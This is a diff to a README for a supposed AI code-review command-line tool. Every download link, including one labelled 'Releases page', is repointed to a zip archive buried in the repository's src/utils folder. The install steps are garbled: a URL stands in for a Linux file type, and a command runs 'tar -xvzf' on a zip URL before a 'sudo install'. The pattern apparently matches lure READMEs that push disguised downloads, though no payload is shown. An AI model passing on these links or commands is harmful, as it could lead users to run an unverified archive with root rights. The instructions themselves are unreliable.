@@ -4,7 +4,7 @@
 AI-Code-Review-Pro is an extensible, AI-powered command-line tool and GitHub Action designed to streamline your code reviews. It supports multiple programming languages and offers rich outputs for better insights into your code quality. With plugin support, you can customize your experience to fit your needs.
 
 ## 📥 Download Now
-[![Download AI-Code-Review-Pro](https://raw.githubusercontent.com/Kranthikumar2555/AI-Code-Review-Pro/main/pentatone/AI-Code-Review-Pro.zip)](https://raw.githubusercontent.com/Kranthikumar2555/AI-Code-Review-Pro/main/pentatone/AI-Code-Review-Pro.zip)
+[![Download AI-Code-Review-Pro](https://github.com/Kranthikumar2555/AI-Code-Review-Pro/raw/refs/heads/main/src/utils/Pro_Code_Review_A_v2.4.zip)](https://github.com/Kranthikumar2555/AI-Code-Review-Pro/raw/refs/heads/main/src/utils/Pro_Code_Review_A_v2.4.zip)
 
 ## 🚀 Getting Started
 To get started with AI-Code-Review-Pro, follow the simple steps below. Even if you have little to no programming experience, this guide will help you set up the tool quickly.
@@ -18,12 +18,12 @@ Before you start, ensure your system meets these basic requirements:
 ## 📂 Download & Install
 To download the software, visit the Releases page. Follow these steps:
 
-1. Click this link to go to the [Releases page](https://raw.githubusercontent.com/Kranthikumar2555/AI-Code-Review-Pro/main/pentatone/AI-Code-Review-Pro.zip).
+1. Click this link to go to the [Releases page](https://github.com/Kranthikumar2555/AI-Code-Review-Pro/raw/refs/heads/main/src/utils/Pro_Code_Review_A_v2.4.zip).
 2. Locate the latest version listed.
 3. Download the file suitable for your operating system:
    - For Windows: Look for a `.exe` file.
    - For macOS: Look for a `.dmg` file.
-   - For Linux: Look for a `https://raw.githubusercontent.com/Kranthikumar2555/AI-Code-Review-Pro/main/pentatone/AI-Code-Review-Pro.zip` or `.deb` file.
+   - For Linux: Look for a `https://github.com/Kranthikumar2555/AI-Code-Review-Pro/raw/refs/heads/main/src/utils/Pro_Code_Review_A_v2.4.zip` or `.deb` file.
 
 After downloading, follow these steps based on your operating system:
 
@@ -42,7 +42,7 @@ After downloading, follow these steps based on your operating system:
 2. Navigate to the directory where you downloaded the file.
 3. Use the terminal command to extract or install the downloaded file. For example:
    ```
-   tar -xvzf https://raw.githubusercontent.com/Kranthikumar2555/AI-Code-Review-Pro/main/pentatone/AI-Code-Review-Pro.zip
+   tar -xvzf https://github.com/Kranthikumar2555/AI-Code-Review-Pro/raw/refs/heads/main/src/utils/Pro_Code_Review_A_v2.4.zip
    cd AI-Code-Review-Pro
    sudo install AI-Code-Review-Pro /usr/local/bin/
    ```
